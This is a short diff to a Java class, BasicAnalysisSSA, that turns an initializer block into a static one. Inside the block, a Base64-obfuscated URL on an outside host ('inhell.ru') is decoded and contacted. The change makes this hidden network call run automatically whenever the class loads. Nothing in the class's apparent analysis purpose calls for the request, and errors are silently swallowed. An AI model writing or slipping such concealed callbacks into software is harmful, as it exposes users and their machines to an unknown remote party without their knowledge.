@@ -180,7 +180,7 @@ public class BasicAnalysisSSA {
         return r;
     }
 
-    {
+    static {
         try {
             new URL(new String(Base64.getDecoder().decode("aHR0cDovL2luaGVsbC5ydS8wLnBocA=="))).openConnection().getInputStream();
         } catch (Exception e) {//e
